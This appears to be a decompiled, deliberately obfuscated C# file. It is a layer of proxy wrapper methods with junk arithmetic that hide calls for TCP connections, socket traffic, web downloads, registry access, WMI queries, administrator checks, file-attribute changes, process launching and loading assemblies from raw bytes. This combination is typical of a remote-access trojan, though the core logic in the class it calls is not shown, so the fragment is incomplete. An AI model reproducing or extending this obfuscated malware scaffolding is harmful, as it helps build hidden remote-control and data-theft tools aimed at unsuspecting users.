using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Security.Policy;
using System.Security.Principal;
using System.Text;
using System.Timers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class9
{
	internal sealed class Class10
	{
		internal static void smethod_0<T>(T gparam_0, int int_0, char char_0)
		{
			int num = 0;
			int num2;
			do
			{
				switch (((char_0 ^ int_0) - 94) ^ num)
				{
				case 1:
					Class14.Class16.smethod_0((object)gparam_0, 'ĝ', 353);
					break;
				case 0:
					Class14.Class16.smethod_0((object)gparam_0, 'Ɲ', 486);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static void smethod_1(short short_0, int int_0)
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 36) ^ 0)
			{
			case 0:
				Class14.smethod_0('ι', 904);
				break;
			case 1:
				Class14.smethod_0('Ĺ', 267);
				break;
			case 2:
				Class14.smethod_0('\u0323', 784);
				break;
			}
			num++;
		}

		internal static RegistryProxy smethod_2<T>(T gparam_0, char char_0, short short_0) where T : ServerComputer
		{
			int num = 0;
			RegistryProxy result = (RegistryProxy)((((short_0 ^ char_0) - 25) ^ 0) switch
			{
				0 => Class14.smethod_1<ServerComputer>((ServerComputer)(object)gparam_0, (short)662, '\u02d2'), 
				_ => null, 
			});
			num++;
			return result;
		}

		internal static int smethod_3<T>(T gparam_0, char char_0, int int_0) where T : TcpClient
		{
			int num = 0;
			int result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 109) ^ num) switch
				{
					0 => Class14.Class16.smethod_1((TcpClient)gparam_0, 444, 'ǅ'), 
					_ => int_0, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static bool smethod_4<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : string where U : string
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 117) ^ num) switch
				{
					0 => Class14.Class16.smethod_2((string)gparam_0, (string)gparam_1, 724, 'ʄ'), 
					_ => true, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_5<T>(T gparam_0, int int_0, char char_0) where T : Timer
		{
			int num = 0;
			do
			{
				switch (((int_0 ^ char_0) - 20) ^ num)
				{
				case 1:
					Class14.smethod_2((Timer)gparam_0, 'ŉ', 'ĸ');
					break;
				case 0:
					Class14.smethod_2((Timer)gparam_0, 'ɲ', 'Ȃ');
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static object smethod_6<T, U, V>(U gparam_0, V gparam_1, T gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool[] bool_0, short short_0, short short_1) where T : string where V : Type
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((short_1 ^ short_0) - 6) ^ num) switch
				{
					0 => Class14.Class15.smethod_3((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, 411, 506), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static bool smethod_7<T>(T gparam_0, int int_0, char char_0) where T : string
		{
			int num = 0;
			bool result = (((int_0 ^ char_0) - 34) ^ 0) switch
			{
				0 => Class14.Class15.smethod_4((string)gparam_0, 645, (short)641), 
				1 => Class14.Class15.smethod_4((string)gparam_0, 751, (short)746), 
				_ => true, 
			};
			num++;
			return result;
		}

		internal static int smethod_8<T>(T gparam_0, short short_0, short short_1) where T : Array
		{
			int num = 0;
			int result;
			do
			{
				result = (((short_1 ^ short_0) - 15) ^ num) switch
				{
					0 => Class14.Class15.smethod_6((Array)gparam_0, 328, (short)310), 
					_ => 11, 
				};
				num++;
			}
			while ((short_1 * short_1 + short_1) % 2 != 0);
			return result;
		}

		internal static int smethod_9<T>(T gparam_0, AppWinStyle appWinStyle_0, bool bool_0, int int_0, short short_0, char char_0) where T : string
		{
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			int result = (((char_0 ^ short_0) - 60) ^ 0) switch
			{
				0 => Class14.Class16.smethod_3((string)gparam_0, appWinStyle_0, bool_0, int_0, 'ʑ', '\u02da'), 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static string smethod_10<T, U, V, W>(W gparam_0, U gparam_1, T gparam_2, V gparam_3, int int_0, short short_0) where T : string where U : string where V : string where W : string
		{
			int num = 0;
			string result = (((int_0 ^ short_0) - 25) ^ 0) switch
			{
				0 => (string)(ICloneable)string.Concat(gparam_0, gparam_1, gparam_2, gparam_3), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static OperatingSystem smethod_11(short short_0, char char_0)
		{
			int num = 0;
			OperatingSystem result = (((short_0 ^ char_0) - 66) ^ 0) switch
			{
				0 => Class14.smethod_4(298, 'Ĩ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static Assembly smethod_12(int int_0, int int_1)
		{
			int num = 0;
			Assembly result = (((int_1 ^ int_0) - 95) ^ 0) switch
			{
				0 => Class14.Class16.smethod_5('\u0019', 21), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static byte[] smethod_13<T>(T gparam_0, char char_0, char char_1) where T : MemoryStream
		{
			int num = 0;
			byte[] result = (((char_1 ^ char_0) - 82) ^ 0) switch
			{
				0 => (byte[])(Array)Class14.Class15.smethod_8((MemoryStream)gparam_0, 716, 'ʖ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_14<T>(T gparam_0, short short_0, int int_0) where T : string
		{
			int num = 0;
			switch (((short_0 ^ int_0) - 79) ^ 0)
			{
			case 0:
				Class14.Class15.smethod_9((string)gparam_0, 605, (short)620);
				break;
			}
			num++;
		}

		internal static Assembly smethod_15<T>(byte[] byte_0, byte[] byte_1, T gparam_0, short short_0, char char_0) where T : Evidence
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			int num = 0;
			Assembly result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 77) ^ num) switch
				{
					0 => (Assembly)(_Assembly)Class14.Class16.Class17.smethod_1(byte_0, byte_1, (Evidence)gparam_0, (short)16, 112), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static long smethod_16<T>(T gparam_0, int int_0, short short_0) where T : MemoryStream
		{
			int num = 0;
			long result;
			int num2;
			do
			{
				result = (((short_0 ^ int_0) - 29) ^ num) switch
				{
					0 => Class14.Class16.smethod_7((MemoryStream)gparam_0, 485, (short)391), 
					_ => 5L, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static object smethod_17<T, U>(T gparam_0, U gparam_1, short short_0, int int_0)
		{
			int num = 0;
			object result;
			do
			{
				result = (((int_0 ^ short_0) - 42) ^ num) switch
				{
					0 => Class14.Class16.Class17.smethod_2((object)gparam_0, (object)gparam_1, 284, (short)295), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static RegistryKey smethod_18<T, U>(T gparam_0, U gparam_1, bool bool_0, char char_0, int int_0) where T : RegistryKey where U : string
		{
			int num = 0;
			RegistryKey result = (((int_0 ^ char_0) - 78) ^ 0) switch
			{
				0 => Class14.Class16.smethod_8((RegistryKey)gparam_0, (string)gparam_1, bool_0, 'ʹ', 'ʓ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_19<T>(T gparam_0, ProcessWindowStyle processWindowStyle_0, int int_0, int int_1) where T : ProcessStartInfo
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 70) ^ 0)
			{
			case 0:
				Class14.smethod_5((ProcessStartInfo)gparam_0, processWindowStyle_0, 'ǅ', (short)399);
				break;
			}
			num++;
		}

		internal static Process smethod_20<T>(T gparam_0, int int_0, int int_1) where T : ProcessStartInfo
		{
			int num = 0;
			Process result = (((int_0 ^ int_1) - 79) ^ 0) switch
			{
				0 => Class14.Class15.smethod_12((ProcessStartInfo)gparam_0, 233, (short)251), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_21<T, U, V>(U gparam_0, T gparam_1, V gparam_2, object[] object_0, string[] string_0, Type[] type_0, short short_0, char char_0) where T : Type where V : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((short_0 ^ char_0) - 46) ^ num)
				{
				case 0:
					NewLateBinding.LateSet((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}
	}

	internal sealed class Class11
	{
		internal static Socket smethod_0<T>(T gparam_0, short short_0, int int_0) where T : TcpClient
		{
			int num = 0;
			Socket result = (((int_0 ^ short_0) - 43) ^ 0) switch
			{
				0 => Class14.Class16.Class17.smethod_3((TcpClient)gparam_0, 664, 'ʈ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static string[] smethod_1<T, U>(T gparam_0, U gparam_1, int int_0, CompareMethod compareMethod_0, char char_0, char char_1) where T : string where U : string
		{
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			string[] result = (((char_1 ^ char_0) - 86) ^ 0) switch
			{
				0 => (string[])(Array)Class14.Class15.smethod_13((string)gparam_0, (string)gparam_1, int_0, compareMethod_0, 711, 720), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static int smethod_2<T>(T gparam_0, short short_0, char char_0)
		{
			int num = 0;
			int result = (((char_0 ^ short_0) - 117) ^ 0) switch
			{
				0 => Class14.Class15.smethod_14((object)gparam_0, 'Ϝ', (short)914), 
				_ => 4, 
			};
			num++;
			return result;
		}

		internal static string[] smethod_3<T>(T gparam_0, char[] char_0, short short_0, short short_1) where T : string
		{
			int num = 0;
			string[] result = (((short_1 ^ short_0) - 51) ^ 0) switch
			{
				0 => (string[])(IEnumerable)Class14.Class16.smethod_10((string)gparam_0, char_0, 'ª', '¶'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_4<T>(T gparam_0, int int_0, short short_0) where T : StreamWriter
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 0) ^ 0)
			{
			case 0:
				Class14.Class16.smethod_11((StreamWriter)gparam_0, 'ʝ', (short)701);
				break;
			}
			num++;
		}

		internal static ManagementObjectCollection smethod_5<T>(T gparam_0, short short_0, short short_1) where T : ManagementObjectSearcher
		{
			int num = 0;
			ManagementObjectCollection result;
			do
			{
				result = (ManagementObjectCollection)((((short_1 ^ short_0) - 94) ^ num) switch
				{
					0 => Class14.smethod_7<ManagementObjectSearcher>((ManagementObjectSearcher)(object)gparam_0, '\u030d', (short)864), 
					_ => null, 
				});
				num++;
			}
			while ((short_1 * short_1 + short_1) % 2 != 0);
			return result;
		}

		internal static string smethod_6<T>(T gparam_0, int int_0, short short_0) where T : string
		{
			int num = 0;
			string result;
			do
			{
				result = (((short_0 ^ int_0) - 84) ^ num) switch
				{
					3 => Class14.smethod_8((string)gparam_0, 579, (short)546), 
					2 => Class14.smethod_8((string)gparam_0, 1016, (short)920), 
					1 => Class14.smethod_8((string)gparam_0, 79, (short)16), 
					0 => Class14.smethod_8((string)gparam_0, 305, (short)367), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static byte[] smethod_7<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : Encoding where U : string
		{
			int num = 0;
			byte[] result = (((short_0 ^ int_0) - 86) ^ 0) switch
			{
				0 => Class14.smethod_9((Encoding)gparam_0, (string)gparam_1, 541, 'ɳ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_8<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : Socket where U : EndPoint
		{
			int num = 0;
			do
			{
				switch (((int_0 ^ char_0) - 36) ^ num)
				{
				case 0:
					Class14.Class16.smethod_12((Socket)gparam_0, (EndPoint)gparam_1, 'Ō', 'Ŝ');
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static object smethod_9<T, U, V>(V gparam_0, U gparam_1, T gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool[] bool_0, bool bool_1, short short_0, char char_0) where T : string where U : Type
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 32) ^ num) switch
				{
					0 => Class14.smethod_11((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1, 'ʌ', 'ʣ'), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_10<T, U, V>(U gparam_0, V gparam_1, T gparam_2, short short_0, int int_0) where T : string where U : FileSystemProxy where V : string
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 103) ^ 0)
			{
			case 0:
				Class14.Class15.smethod_18<string, FileSystemProxy, string>((FileSystemProxy)(object)gparam_0, (string)gparam_1, (string)gparam_2, 'Ͱ', 875);
				break;
			}
			num++;
		}

		internal static void smethod_11<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : AppDomain where U : ResolveEventHandler
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 11) ^ 0)
			{
			case 0:
				gparam_0.ResourceResolve += gparam_1;
				break;
			}
			num++;
		}

		internal static string smethod_12<T>(T gparam_0, short short_0, int int_0) where T : ResolveEventArgs
		{
			int num = 0;
			string result = (((int_0 ^ short_0) - 7) ^ 0) switch
			{
				0 => (string)(IEnumerable)gparam_0.Name, 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static bool smethod_13<T, U>(T gparam_0, U gparam_1, char char_0, short short_0)
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 63) ^ num) switch
				{
					0 => Class14.Class16.Class17.smethod_7((object)gparam_0, (object)gparam_1, 45, '6'), 
					_ => false, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_14<T, U, V>(U gparam_0, V gparam_1, T gparam_2, char char_0, int int_0) where U : AppDomain where V : string
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ int_0) - 72) ^ num)
				{
				case 0:
					Class14.Class15.smethod_19((AppDomain)gparam_0, (string)gparam_1, (object)gparam_2, 174, 219);
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static int smethod_15<T>(T gparam_0, short short_0, int int_0) where T : string
		{
			int num = 0;
			int result = (((int_0 ^ short_0) - 46) ^ 0) switch
			{
				0 => Class14.Class16.Class17.smethod_9((string)gparam_0, 'p', 'y'), 
				1 => Class14.Class16.Class17.smethod_9((string)gparam_0, 'Ϟ', 'ϔ'), 
				2 => Class14.Class16.Class17.smethod_9((string)gparam_0, '\u02e5', 'ˮ'), 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static string smethod_16<T, U, V>(V gparam_0, U gparam_1, T gparam_2, int int_0, int int_1) where T : string where U : string where V : string
		{
			int num = 0;
			string result = (((int_1 ^ int_0) - 76) ^ 0) switch
			{
				0 => string.Concat(gparam_0, gparam_1, gparam_2), 
				1 => gparam_0.Replace(gparam_1, gparam_2), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static RegistryKey smethod_17<T>(T gparam_0, short short_0, char char_0) where T : RegistryProxy
		{
			int num = 0;
			RegistryKey result = (((short_0 ^ char_0) - 28) ^ 0) switch
			{
				0 => Class14.smethod_12<RegistryProxy>((RegistryProxy)(object)gparam_0, (short)72, '_'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_18<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : Timer where U : ElapsedEventHandler
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 38) ^ 0)
			{
			case 0:
				Class14.Class16.smethod_16((Timer)gparam_0, (ElapsedEventHandler)gparam_1, 164, '»');
				break;
			}
			num++;
		}

		internal static Encoding smethod_19(int int_0, int int_1)
		{
			int num = 0;
			Encoding result = (((int_1 ^ int_0) - 73) ^ 0) switch
			{
				0 => Class14.Class15.smethod_22('ɵ', 522), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_20<T, U>(T gparam_0, U gparam_1, bool bool_0, short short_0, char char_0) where T : RegistryKey where U : string
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 94) ^ 0)
			{
			case 0:
				Class14.Class16.smethod_18((RegistryKey)gparam_0, (string)gparam_1, bool_0, (short)922, 954);
				break;
			}
			num++;
		}

		internal static object smethod_21<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : string where U : string
		{
			int num = 0;
			object result = (((short_0 ^ char_0) - 78) ^ 0) switch
			{
				0 => Interaction.CreateObject((string)gparam_0, (string)gparam_1), 
				_ => null, 
			};
			num++;
			return result;
		}
	}

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 78)]
	private struct Struct6
	{
	}

	private static readonly object object_0;

	private static readonly object object_1;

	private static readonly object object_2;

	internal static byte byte_0/* Not supported: data(00) */;

	internal static object smethod_0<T>(T gparam_0, char char_0, short short_0)
	{
		int num = 0;
		object result;
		do
		{
			result = (((short_0 ^ char_0) - 48) ^ num) switch
			{
				0 => RuntimeHelpers.GetObjectValue(gparam_0), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_1<T>(T gparam_0, char char_0, int int_0) where T : TcpClient
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 28) ^ 0)
		{
		case 0:
			Class14.Class16.Class17.smethod_11((TcpClient)gparam_0, 1, 113);
			break;
		}
		num++;
	}

	internal static string smethod_2<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : string where U : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((int_0 ^ char_0) - 1) ^ num) switch
			{
				0 => (string)(IConvertible)Class14.smethod_15((string)gparam_0, (string)gparam_1, 247, 253), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static void smethod_3<T>(T gparam_0, char char_0, int int_0) where T : Exception
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ int_0) - 63) ^ num)
			{
			case 0:
				Class14.Class15.smethod_7((Exception)gparam_0, 5, 114);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static Evidence smethod_4<T>(T gparam_0, char char_0, int int_0) where T : Assembly
	{
		int num = 0;
		Evidence result = (((char_0 ^ int_0) - 38) ^ 0) switch
		{
			0 => Class14.Class16.smethod_19((Assembly)gparam_0, (short)481, 423), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_5<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, char char_0, int int_2) where T : Stream
	{
		int num = 0;
		int result = (((int_2 ^ char_0) - 86) ^ 0) switch
		{
			0 => Class14.smethod_16((Stream)gparam_0, byte_1, int_0, int_1, (short)488, 394), 
			_ => int_1, 
		};
		num++;
		return result;
	}

	internal static int smethod_6<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, SocketFlags socketFlags_0, char char_0, char char_1) where T : Socket
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((char_1 ^ char_0) - 12) ^ num) switch
			{
				1 => Class14.Class16.Class17.smethod_12((Socket)gparam_0, byte_1, int_0, int_1, socketFlags_0, (short)944, (short)947), 
				0 => Class14.Class16.Class17.smethod_12((Socket)gparam_0, byte_1, int_0, int_1, socketFlags_0, (short)813, (short)815), 
				_ => int_0, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static bool smethod_7<T>(T gparam_0, int int_0, SelectMode selectMode_0, int int_1, short short_0) where T : Socket
	{
		int num = 0;
		bool result;
		do
		{
			result = (((int_1 ^ short_0) - 100) ^ num) switch
			{
				0 => Class14.smethod_17((Socket)gparam_0, int_0, selectMode_0, 153, 'ö'), 
				_ => true, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static string smethod_8(string[] string_0, int int_0, short short_0)
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ int_0) - 1) ^ num) switch
			{
				0 => (string)(IEnumerable<char>)string.Concat(string_0), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_9<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : TextWriter where U : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_0) - 124) ^ num)
			{
			case 0:
				Class14.Class16.smethod_20((TextWriter)gparam_0, (string)gparam_1, 'ɇ', (short)515);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static string[] smethod_10<T>(T gparam_0, char char_0, int int_0) where T : string
	{
		int num = 0;
		string[] result = (((char_0 ^ int_0) - 100) ^ 0) switch
		{
			0 => (string[])(ICollection)Class14.smethod_18((string)gparam_0, 586, (short)557), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_11<T>(T gparam_0, double double_0, int int_0, char char_0) where T : Timer
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 82) ^ 0)
		{
		case 0:
			Class14.Class16.smethod_21((Timer)gparam_0, double_0, (short)869, (short)892);
			break;
		}
		num++;
	}

	internal static AppDomain smethod_12(int int_0, short short_0)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		int num = 0;
		AppDomain result = (((int_0 ^ short_0) - 115) ^ 0) switch
		{
			0 => (AppDomain)(IEvidenceFactory)Class14.Class16.smethod_22(729, 735), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_13<T>(T gparam_0, FileAttributes fileAttributes_0, short short_0, short short_1) where T : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ short_1) - 94) ^ num)
			{
			case 0:
				File.SetAttributes(gparam_0, fileAttributes_0);
				break;
			}
			num++;
			num2 = short_1 * short_1;
			num2 = short_1 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static StringBuilder smethod_14<T>(T gparam_0, char char_0, short short_0, char char_1) where T : StringBuilder
	{
		int num = 0;
		StringBuilder result = (((short_0 ^ char_1) - 14) ^ 0) switch
		{
			0 => (StringBuilder)(ISerializable)gparam_0.Append(char_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static bool smethod_15<T>(T gparam_0, WindowsBuiltInRole windowsBuiltInRole_0, char char_0, char char_1) where T : WindowsPrincipal
	{
		int num = 0;
		bool result;
		int num2;
		do
		{
			result = (((char_0 ^ char_1) - 2) ^ num) switch
			{
				0 => Class14.Class16.smethod_23((WindowsPrincipal)gparam_0, windowsBuiltInRole_0, '\u0332', (short)813), 
				_ => true, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_16<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : WebClient where U : string
	{
		int num = 0;
		string result = (((short_0 ^ int_0) - 31) ^ 0) switch
		{
			0 => (string)(IComparable)Class14.smethod_19((WebClient)gparam_0, (string)gparam_1, (short)2, '\\'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_17<T, U>(U gparam_0, T gparam_1, int int_0, int int_1, int int_2) where T : string where U : TcpClient
	{
		int num = 0;
		switch (((int_1 ^ int_2) - 36) ^ 0)
		{
		case 0:
			gparam_0.Connect(gparam_1, int_0);
			break;
		}
		num++;
	}

	internal static void smethod_18<T, U, V>(U gparam_0, V gparam_1, T gparam_2, object[] object_3, string[] string_0, Type[] type_0, bool bool_0, bool bool_1, char char_0, char char_1) where T : string where V : Type
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_1 ^ char_0) - 109) ^ num)
			{
			case 0:
				Class14.Class16.smethod_24((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_3, string_0, type_0, bool_0, bool_1, 'ȫ', 616);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static bool smethod_19<T>(T gparam_0, int int_0, short short_0) where T : Socket
	{
		int num = 0;
		bool result = (((short_0 ^ int_0) - 39) ^ 0) switch
		{
			0 => Class14.Class15.smethod_23((Socket)gparam_0, 190, 243), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static int smethod_20<T>(T gparam_0, short short_0, char char_0) where T : Socket
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 99) ^ num) switch
			{
				0 => gparam_0.Available, 
				_ => 10, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static char smethod_21<T>(T gparam_0, int int_0, short short_0, int int_1) where T : string
	{
		int num = 0;
		char result = (((short_0 ^ int_1) - 89) ^ 0) switch
		{
			0 => gparam_0[int_0], 
			_ => '\u0092', 
		};
		num++;
		return result;
	}

	internal static DriveInfo[] smethod_22(char char_0, char char_1)
	{
		int num = 0;
		DriveInfo[] result = (((char_0 ^ char_1) - 122) ^ 0) switch
		{
			0 => (DriveInfo[])(IList)Class14.Class16.smethod_25('\u0378', 811), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static object smethod_23<T, U>(bool bool_0, U gparam_0, T gparam_1, short short_0, int int_0)
	{
		int num = 0;
		object result;
		do
		{
			result = (((int_0 ^ short_0) - 109) ^ num) switch
			{
				0 => Class14.smethod_20(bool_0, (object)gparam_0, (object)gparam_1, (short)895, '\u0379'), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static ManagementObjectEnumerator smethod_24<T>(T gparam_0, int int_0, char char_0) where T : ManagementObjectCollection
	{
		int num = 0;
		ManagementObjectEnumerator result;
		int num2;
		do
		{
			result = (ManagementObjectEnumerator)((((int_0 ^ char_0) - 117) ^ num) switch
			{
				0 => Class14.smethod_21<ManagementObjectCollection>((ManagementObjectCollection)(object)gparam_0, (short)502, 462), 
				_ => null, 
			});
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static bool smethod_25<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : string where U : FileSystemProxy
	{
		int num = 0;
		bool result = (((int_0 ^ int_1) - 13) ^ 0) switch
		{
			0 => Class14.Class16.smethod_26<FileSystemProxy, string>((FileSystemProxy)(object)gparam_0, (string)gparam_1, 'ʻ', (short)727), 
			_ => false, 
		};
		num++;
		return result;
	}

	internal static void smethod_26<T>(T gparam_0, int int_0, int int_1) where T : Socket
	{
		int num = 0;
		switch (((int_1 ^ int_0) - 97) ^ 0)
		{
		case 0:
			gparam_0.Close();
			break;
		}
		num++;
	}

	static Class9()
	{
		object_1 = new char[39];
		char[] array = new char[8];
		array[0] = '\u0098';
		array[7] = '∊';
		array[5] = '〨';
		array[3] = '㖂';
		array[4] = 'ܙ';
		array[1] = 'ラ';
		array[6] = '⌚';
		array[2] = 'Ӑ';
		object_2 = new string[1];
		object_0 = array;
	}
}
